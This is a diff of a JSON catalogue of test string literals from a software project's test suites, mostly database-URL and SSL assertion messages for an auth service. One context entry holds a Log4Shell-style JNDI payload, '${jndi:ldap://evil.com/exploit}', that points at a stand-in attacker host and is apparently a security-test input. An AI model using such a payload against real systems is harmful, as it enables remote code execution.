@@ -2,9 +2,9 @@
   "metadata": {
     "version": "3.0.0",
     "category": "test_literals",
-    "generated_at": "2025-08-23T16:14:32.603331",
+    "generated_at": "2025-08-24T02:12:32.048112",
     "root_directory": "C:\\Users\\antho\\OneDrive\\Desktop\\Netra\\netra-core-generation-1",
-    "total_literals": 5320
+    "total_literals": 5439
   },
   "literals": {
     "\u001b[0m": {
@@ -756,6 +756,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/generate_test_audit.py:187"
+      ]
+    },
+    "$(STAGING_DB_PASSWORD)": {
+      "value": "$(STAGING_DB_PASSWORD)",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:157"
       ]
     },
     "${jndi:ldap://evil.com/exploit}": {
@@ -1967,6 +1974,13 @@
         "scripts/test_staging_startup.py:90"
       ]
     },
+    ", Got:": {
+      "value": ", Got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:319"
+      ]
+    },
     ", Improvement:": {
       "value": ", Improvement:",
       "category": "test_literals",
@@ -1986,6 +2000,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/compliance/test_limits_checker.py:156"
+      ]
+    },
+    ", connection=": {
+      "value": ", connection=",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:140"
       ]
     },
     ", expected pattern": {
@@ -2008,6 +2029,7 @@
       "locations": [
         "auth_service/tests/base/test_mixins.py:38",
         "auth_service/tests/base/test_mixins.py:58",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:305",
         "auth_service/tests/utils/assertion_helpers.py:166",
         "auth_service/tests/utils/assertion_helpers.py:186",
         "auth_service/tests/utils/assertion_helpers.py:202",
@@ -4993,9 +5015,16 @@
       "value": "/cloudsql/",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:83",
         "auth_service/tests/test_cloud_sql_url.py:39",
         "auth_service/tests/test_database_manager.py:42",
-        "auth_service/tests/test_database_manager.py:83"
+        "auth_service/tests/test_database_manager.py:83",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:56",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:114",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:173",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:176",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:215",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:244"
       ]
     },
     "/docs": {
@@ -6648,7 +6677,7 @@
       "value": "AUTH_FAST_TEST_MODE",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:15",
+        "auth_service/tests/conftest.py:28",
         "auth_service/tests/test_critical_staging_issues.py:80",
         "auth_service/tests/test_database_manager.py:152",
         "auth_service/tests/test_database_manager.py:155",
@@ -6673,7 +6702,7 @@
       "value": "AUTH_USE_FILE_DB",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:20"
+        "auth_service/tests/conftest.py:33"
       ]
     },
     "AUTOCOMMIT": {
@@ -7256,6 +7285,13 @@
         "scripts/test_auth_integration.py:130"
       ]
     },
+    "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures": {
+      "value": "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:1"
+      ]
+    },
     "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests": {
       "value": "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests",
       "category": "test_literals",
@@ -7340,11 +7376,18 @@
         "scripts/test_auth_integration.py:35"
       ]
     },
-    "Auth service specific test configuration.\nDepends on root /tests/conftest.py for common fixtures and environment setup.": {
-      "value": "Auth service specific test configuration.\nDepends on root /tests/conftest.py for common fixtures and environment setup.",
+    "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.": {
+      "value": "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/conftest.py:1"
+      ]
+    },
+    "AuthConfig should normalize DATABASE_URL": {
+      "value": "AuthConfig should normalize DATABASE_URL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:212"
       ]
     },
     "AuthDatabaseManager missing get_auth_database_url_async static method": {
@@ -7352,6 +7395,34 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_critical_staging_issues.py:36"
+      ]
+    },
+    "AuthDatabaseManager must have get_auth_database_url_async method": {
+      "value": "AuthDatabaseManager must have get_auth_database_url_async method",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:31"
+      ]
+    },
+    "AuthDatabaseManager must have is_cloud_sql_environment method": {
+      "value": "AuthDatabaseManager must have is_cloud_sql_environment method",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:153"
+      ]
+    },
+    "AuthDatabaseManager must have is_test_environment method": {
+      "value": "AuthDatabaseManager must have is_test_environment method",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:196"
+      ]
+    },
+    "AuthDatabaseManager must have validate_auth_url method": {
+      "value": "AuthDatabaseManager must have validate_auth_url method",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:110"
       ]
     },
     "AuthSessionFactory": {
@@ -8495,6 +8566,13 @@
         "scripts/test_async_postgres.py:175"
       ]
     },
+    "Cloud SQL URL contains sslmode parameter": {
+      "value": "Cloud SQL URL contains sslmode parameter",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:245"
+      ]
+    },
     "Code:": {
       "value": "Code:",
       "category": "test_literals",
@@ -8592,6 +8670,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/test_backend.py:2"
+      ]
+    },
+    "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization": {
+      "value": "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:1"
       ]
     },
     "Comprehensive fake test detection and reporting": {
@@ -8785,6 +8870,13 @@
         "scripts/compliance/fake_test_scanner.py:296"
       ]
     },
+    "Contains sslmode parameter for Cloud SQL": {
+      "value": "Contains sslmode parameter for Cloud SQL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:313"
+      ]
+    },
     "Content-Type": {
       "value": "Content-Type",
       "category": "test_literals",
@@ -8920,13 +9012,6 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/database/test_config.py:50"
-      ]
-    },
-    "Create async database session for tests with fresh tables": {
-      "value": "Create async database session for tests with fresh tables",
-      "category": "test_literals",
-      "locations": [
-        "auth_service/tests/conftest.py:144"
       ]
     },
     "Create audit log entry": {
@@ -9262,9 +9347,9 @@
         "auth_service/tests/config/test_env.py:182",
         "auth_service/tests/config/test_env.py:193",
         "auth_service/tests/config/test_settings.py:166",
-        "auth_service/tests/conftest.py:19",
-        "auth_service/tests/test_cloud_sql_url.py:24",
-        "auth_service/tests/test_cloud_sql_url.py:51"
+        "auth_service/tests/conftest.py:32",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:100",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:302"
       ]
     },
     "DEBUG": {
@@ -9442,6 +9527,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/test_staging_env.py:148"
+      ]
+    },
+    "Database URL should not be empty": {
+      "value": "Database URL should not be empty",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:277"
       ]
     },
     "Database connection appears functional": {
@@ -9834,7 +9926,7 @@
         "auth_service/tests/config/test_env.py:21",
         "auth_service/tests/config/test_env.py:149",
         "auth_service/tests/config/test_settings.py:161",
-        "auth_service/tests/conftest.py:14",
+        "auth_service/tests/conftest.py:27",
         "auth_service/tests/test_cloud_sql_url.py:24",
         "auth_service/tests/test_cloud_sql_url.py:51",
         "auth_service/tests/test_cloud_sql_url.py:74",
@@ -10241,6 +10333,13 @@
         "scripts/test_error_monitor_logic.py:201"
       ]
     },
+    "Error should mention URL problem for input:": {
+      "value": "Error should mention URL problem for input:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:332"
+      ]
+    },
     "Error splitting": {
       "value": "Error splitting",
       "category": "test_literals",
@@ -10462,6 +10561,7 @@
       "value": "Expected",
       "category": "test_literals",
       "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:305",
         "auth_service/tests/utils/assertion_helpers.py:248"
       ]
     },
@@ -10500,6 +10600,13 @@
         "auth_service/tests/test_critical_staging_issues.py:106"
       ]
     },
+    "Expected SSL-related error, got:": {
+      "value": "Expected SSL-related error, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:186"
+      ]
+    },
     "Expected STAGING, got": {
       "value": "Expected STAGING, got",
       "category": "test_literals",
@@ -10512,6 +10619,13 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_critical_staging_issues.py:51"
+      ]
+    },
+    "Expected asyncpg format, got:": {
+      "value": "Expected asyncpg format, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:50"
       ]
     },
     "Expected error code '": {
@@ -10540,6 +10654,13 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_postgres_compliance.py:171"
+      ]
+    },
+    "Expected ssl=require parameter, got:": {
+      "value": "Expected ssl=require parameter, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:68"
       ]
     },
     "Expected staging frontend URL, got:": {
@@ -10641,6 +10762,20 @@
         "scripts/compliance/fake_test_scanner.py:294"
       ]
     },
+    "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.": {
+      "value": "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:90"
+      ]
+    },
+    "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.": {
+      "value": "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:144"
+      ]
+    },
     "FAKE TEST ANALYSIS:": {
       "value": "FAKE TEST ANALYSIS:",
       "category": "test_literals",
@@ -10655,6 +10790,13 @@
         "scripts/test_backend.py:83",
         "scripts/test_config_loading.py:34",
         "scripts/test_staging_config.py:55"
+      ]
+    },
+    "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.": {
+      "value": "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:33"
       ]
     },
     "FIXED_SESSION_12345": {
@@ -11663,7 +11805,7 @@
         "auth_service/tests/config/test_env.py:38",
         "auth_service/tests/config/test_env.py:202",
         "auth_service/tests/config/test_settings.py:185",
-        "auth_service/tests/conftest.py:17",
+        "auth_service/tests/conftest.py:30",
         "scripts/test_backend.py:92",
         "scripts/test_oauth_local.py:61",
         "scripts/test_oauth_local.py:61",
@@ -11677,11 +11819,18 @@
         "auth_service/tests/config/test_env.py:39",
         "auth_service/tests/config/test_env.py:203",
         "auth_service/tests/config/test_settings.py:186",
-        "auth_service/tests/conftest.py:18",
+        "auth_service/tests/conftest.py:31",
         "scripts/test_backend.py:93",
         "scripts/test_oauth_local.py:62",
         "scripts/test_oauth_local.py:62",
         "scripts/test_oauth_local.py:401"
+      ]
+    },
+    "GOOGLE_CLOUD_PROJECT": {
+      "value": "GOOGLE_CLOUD_PROJECT",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:268"
       ]
     },
     "Generate Business Value Test Coverage Index": {
@@ -12178,6 +12327,13 @@
         "auth_service/tests/integration/test_auth_oauth_errors.py:257"
       ]
     },
+    "Inconsistent SSL handling: manager=": {
+      "value": "Inconsistent SSL handling: manager=",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:140"
+      ]
+    },
     "Increase real LLM test coverage from": {
       "value": "Increase real LLM test coverage from",
       "category": "test_literals",
@@ -12489,7 +12645,7 @@
         "auth_service/debug_db_test.py:11",
         "auth_service/tests/config/test_env.py:22",
         "auth_service/tests/config/test_settings.py:176",
-        "auth_service/tests/conftest.py:16",
+        "auth_service/tests/conftest.py:29",
         "auth_service/tests/test_setup.py:17",
         "auth_service/tests/test_setup.py:18"
       ]
@@ -13128,6 +13284,13 @@
         "auth_service/tests/test_critical_staging_issues.py:93"
       ]
     },
+    "Methods should behave consistently across concurrent calls": {
+      "value": "Methods should behave consistently across concurrent calls",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:427"
+      ]
+    },
     "Metrics exported": {
       "value": "Metrics exported",
       "category": "test_literals",
@@ -13269,13 +13432,6 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/factories/session_factory.py:82"
-      ]
-    },
-    "Mock auth database for testing": {
-      "value": "Mock auth database for testing",
-      "category": "test_literals",
-      "locations": [
-        "auth_service/tests/conftest.py:82"
       ]
     },
     "Mock component class '": {
@@ -14297,6 +14453,13 @@
         "scripts/test_config_loading.py:34"
       ]
     },
+    "PYTEST_CURRENT_TEST": {
+      "value": "PYTEST_CURRENT_TEST",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/conftest.py:26"
+      ]
+    },
     "Parallel Efficiency:": {
       "value": "Parallel Efficiency:",
       "category": "test_literals",
@@ -14818,7 +14981,7 @@
         "auth_service/tests/config/test_env.py:183",
         "auth_service/tests/config/test_env.py:194",
         "auth_service/tests/config/test_settings.py:170",
-        "auth_service/tests/conftest.py:21",
+        "auth_service/tests/conftest.py:34",
         "scripts/test_backend.py:81",
         "scripts/test_staging_startup.py:111",
         "scripts/test_staging_startup.py:217"
@@ -15733,6 +15896,58 @@
         "scripts/test_async_postgres.py:19"
       ]
     },
+    "SSL configuration issues:": {
+      "value": "SSL configuration issues:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:179"
+      ]
+    },
+    "SSL parameter conversion issues:": {
+      "value": "SSL parameter conversion issues:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:118"
+      ]
+    },
+    "SSL parameter missing for regular connection": {
+      "value": "SSL parameter missing for regular connection",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:177"
+      ]
+    },
+    "SSL parameters present in Cloud SQL URL": {
+      "value": "SSL parameters present in Cloud SQL URL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:174"
+      ]
+    },
+    "SSL parameters should be removed": {
+      "value": "SSL parameters should be removed",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:216"
+      ]
+    },
+    "SSL parameters should be removed for Cloud SQL": {
+      "value": "SSL parameters should be removed for Cloud SQL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:54",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:55",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:281",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:282"
+      ]
+    },
+    "SSL parameters still present in Cloud SQL URL:": {
+      "value": "SSL parameters still present in Cloud SQL URL:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:86"
+      ]
+    },
     "STAGING": {
       "value": "STAGING",
       "category": "test_literals",
@@ -16211,11 +16426,35 @@
         "scripts/test_verify_workflow_status_corrected.py:162"
       ]
     },
+    "Should be formatted for asyncpg": {
+      "value": "Should be formatted for asyncpg",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:57",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:217",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:283"
+      ]
+    },
+    "Should contain Cloud SQL path": {
+      "value": "Should contain Cloud SQL path",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:215",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:280"
+      ]
+    },
     "Should detect staging environment for CORS config": {
       "value": "Should detect staging environment for CORS config",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_critical_staging_issues.py:251"
+      ]
+    },
+    "Should detect test environment during pytest run": {
+      "value": "Should detect test environment during pytest run",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:287"
       ]
     },
     "Should fail gracefully when missing required arguments": {
@@ -16304,6 +16543,13 @@
         "scripts/test_error_monitor_logic.py:202"
       ]
     },
+    "Should handle Cloud Run environment": {
+      "value": "Should handle Cloud Run environment",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:398"
+      ]
+    },
     "Should have 1 pre-deployment error": {
       "value": "Should have 1 pre-deployment error",
       "category": "test_literals",
@@ -16330,6 +16576,13 @@
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_session_cleanup.py:237"
+      ]
+    },
+    "Should not contain sslmode parameter, got:": {
+      "value": "Should not contain sslmode parameter, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:70"
       ]
     },
     "Should not show 'development mode' when ENVIRONMENT=staging": {
@@ -16360,11 +16613,81 @@
         "auth_service/tests/test_postgres_compliance.py:115"
       ]
     },
+    "Should preserve Cloud SQL socket path, got:": {
+      "value": "Should preserve Cloud SQL socket path, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:84"
+      ]
+    },
+    "Should preserve host, port, and database name": {
+      "value": "Should preserve host, port, and database name",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:54"
+      ]
+    },
+    "Should return False for invalid URL": {
+      "value": "Should return False for invalid URL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:143"
+      ]
+    },
+    "Should return False for production environment": {
+      "value": "Should return False for production environment",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:244"
+      ]
+    },
+    "Should return False for regular PostgreSQL URLs": {
+      "value": "Should return False for regular PostgreSQL URLs",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:186"
+      ]
+    },
     "Should return None for None user": {
       "value": "Should return None for None user",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_single_database.py:91"
+      ]
+    },
+    "Should return True for Cloud SQL URLs": {
+      "value": "Should return True for Cloud SQL URLs",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:171"
+      ]
+    },
+    "Should return True for valid PostgreSQL URL": {
+      "value": "Should return True for valid PostgreSQL URL",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:128"
+      ]
+    },
+    "Should return True when ENVIRONMENT=test": {
+      "value": "Should return True when ENVIRONMENT=test",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:214"
+      ]
+    },
+    "Should return True when TESTING=true": {
+      "value": "Should return True when TESTING=true",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:229"
+      ]
+    },
+    "Should return True when running under pytest": {
+      "value": "Should return True when running under pytest",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:259"
       ]
     },
     "Should return empty string when DATABASE_URL not set": {
@@ -16374,6 +16697,13 @@
         "auth_service/tests/test_single_database.py:112"
       ]
     },
+    "Should return string even for malformed URL:": {
+      "value": "Should return string even for malformed URL:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:328"
+      ]
+    },
     "Should return user ID without separate database sync": {
       "value": "Should return user ID without separate database sync",
       "category": "test_literals",
@@ -16381,11 +16711,25 @@
         "auth_service/tests/test_single_database.py:87"
       ]
     },
+    "Should still contain Cloud SQL path": {
+      "value": "Should still contain Cloud SQL path",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:56"
+      ]
+    },
     "Should use DATABASE_URL from environment": {
       "value": "Should use DATABASE_URL from environment",
       "category": "test_literals",
       "locations": [
         "auth_service/tests/test_single_database.py:105"
+      ]
+    },
+    "Should use asyncpg driver, got:": {
+      "value": "Should use asyncpg driver, got:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:86"
       ]
     },
     "Should use staging defaults when DATABASE_URL not set, got:": {
@@ -17189,7 +17533,8 @@
         "auth_service/tests/config/test_env.py:49",
         "auth_service/tests/config/test_settings.py:163",
         "scripts/test_backend.py:78",
-        "scripts/test_environment_detection.py:19"
+        "scripts/test_environment_detection.py:19",
+        "shared/database/tests/test_core_database_manager.py:152"
       ]
     },
     "TESTING MODULE:": {
@@ -17203,7 +17548,9 @@
       "value": "TEST_DATABASE_URL",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/config/test_env.py:29"
+        "auth_service/tests/config/test_env.py:29",
+        "shared/database/tests/test_core_database_manager.py:110",
+        "shared/database/tests/test_core_database_manager.py:111"
       ]
     },
     "TEST_DIRECTORIES = {\n    \"unit\": [\"netra_backend/tests/unit\"],\n    \"integration\": [\"netra_backend/tests/integration\"],\n    \"e2e\": [\"netra_backend/tests/e2e\"],\n    \"agents\": [\"netra_backend/tests/agents\"],\n    \"critical\": [\"netra_backend/tests/critical\"],\n    \"routes\": [\"netra_backend/tests/routes\"],\n    \"services\": [\"netra_backend/tests/services\"],\n    \"database\": [\"netra_backend/tests/database\"],\n    \"websocket\": [\"netra_backend/tests/websocket\"],\n    \"auth\": [\"netra_backend/tests/auth_integration\"],\n    \"performance\": [\"netra_backend/tests/performance\"],\n    \"security\": [\"netra_backend/tests/security\"],\n    \"mcp\": [\"netra_backend/tests/mcp\"],\n    \"utils\": [\"netra_backend/tests/utils\"],\n    \"validation\": [\"netra_backend/tests/validation\"],\n    \"config\": [\"netra_backend/tests/config\"],\n    \"startup\": [\"netra_backend/tests/startup\"],\n    \"llm\": [\"netra_backend/tests/llm\"],\n    \"core\": [\"netra_backend/tests/core\"],\n    \"unified_system\": [\"netra_backend/tests/unified_system\"],\n    \"test_framework\": [\"test_framework/tests\"]\n}": {
@@ -17218,6 +17565,20 @@
       "category": "test_literals",
       "locations": [
         "scripts/align_test_imports.py:242"
+      ]
+    },
+    "TEST_MISSING_URL": {
+      "value": "TEST_MISSING_URL",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:117"
+      ]
+    },
+    "TEST_MISSING_URL environment variable not set": {
+      "value": "TEST_MISSING_URL environment variable not set",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:116"
       ]
     },
     "TEST_ORGANIZATION_AUDIT.md": {
@@ -17863,7 +18224,7 @@
       "value": "Test User",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:138",
+        "auth_service/tests/conftest.py:145",
         "auth_service/tests/factories/user_factory.py:39",
         "auth_service/tests/integration/test_auth_oauth_errors.py:56",
         "auth_service/tests/integration/test_auth_oauth_google.py:48",
@@ -18897,6 +19258,20 @@
         "scripts/test_verify_workflow_status.py:209"
       ]
     },
+    "Tests for CoreDatabaseManager shared utility\n\nThis test suite validates the shared database URL handling functionality\nto ensure consistent behavior across all services.": {
+      "value": "Tests for CoreDatabaseManager shared utility\n\nThis test suite validates the shared database URL handling functionality\nto ensure consistent behavior across all services.",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/test_core_database_manager.py:1"
+      ]
+    },
+    "Tests for shared database utilities": {
+      "value": "Tests for shared database utilities",
+      "category": "test_literals",
+      "locations": [
+        "shared/database/tests/__init__.py:1"
+      ]
+    },
     "Tests in excluded directories:": {
       "value": "Tests in excluded directories:",
       "category": "test_literals",
@@ -19396,6 +19771,34 @@
         "scripts/autonomous_review/test_reviewer.py:252"
       ]
     },
+    "URL compatibility issues:": {
+      "value": "URL compatibility issues:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:251"
+      ]
+    },
+    "URL format mismatch. Expected:": {
+      "value": "URL format mismatch. Expected:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:319"
+      ]
+    },
+    "URL format mismatches:": {
+      "value": "URL format mismatches:",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:315"
+      ]
+    },
+    "URL missing asyncpg driver specification": {
+      "value": "URL missing asyncpg driver specification",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:248"
+      ]
+    },
     "URL:": {
       "value": "URL:",
       "category": "test_literals",
@@ -19715,6 +20118,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/autonomous_review/test_generator.py:282"
+      ]
+    },
+    "Uses postgres:// instead of postgresql+asyncpg://": {
+      "value": "Uses postgres:// instead of postgresql+asyncpg://",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:310"
       ]
     },
     "Using fallback execution method": {
@@ -21740,6 +22150,14 @@
         "scripts/analyze_test_overlap.py:95"
       ]
     },
+    "__func__": {
+      "value": "__func__",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_auth_database_manager_missing_method.py:343",
+        "auth_service/tests/test_auth_database_manager_missing_method.py:351"
+      ]
+    },
     "__init__.py": {
       "value": "__init__.py",
       "category": "test_literals",
@@ -21759,9 +22177,9 @@
         "auth_service/tests/test_postgres_compliance.py:249",
         "auth_service/tests/test_setup.py:49",
         "auth_service/tests/test_single_database.py:114",
+        "auth_service/tests/test_staging_auth_ssl_failures.py:322",
         "auth_service/tests/unit/test_oauth_models.py:240",
-        "scripts/add_test_markers.py:247",
-        "scripts/align_test_imports.py:458"
+        "scripts/add_test_markers.py:247"
       ]
     },
     "__pycache__": {
@@ -22065,6 +22483,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/real_service_test_metrics.py:107"
+      ]
+    },
+    "_load_from_secret_manager": {
+      "value": "_load_from_secret_manager",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:234"
       ]
     },
     "_normalize_postgres_url": {
@@ -23299,7 +23724,7 @@
       "value": "auth_service.auth_core.core.session_manager.redis",
       "category": "test_literals",
       "locations": [
-        "auth_service/tests/conftest.py:125"
+        "auth_service/tests/conftest.py:132"
       ]
     },
     "auth_service.auth_core.database.connection.auth_db.get_session": {
@@ -24625,6 +25050,13 @@
       "category": "test_literals",
       "locations": [
         "scripts/align_test_imports.py:406"
+      ]
+    },
+    "configuration": {
+      "value": "configuration",
+      "category": "test_literals",
+      "locations": [
+        "auth_service/tests/test_staging_auth_ssl_failures.py:185"
       ]
     },
     "configuration_loading": {
@@ -26143,7 +26575,7 @@
         "auth_service/tests/base/test_mixins.py:219",
         "auth_service/tests/base/test_mixins.py:223",
         "auth_service/tests/base/test_mixins.py:265",
-        "auth_service/tests/conftest.py:137",
+        "auth_service/tests/conftest.py:144",
         "auth_service/tests/factories/token_factory.py:37"
       ]
     },
@@ -27188,7 +27620,7 @@
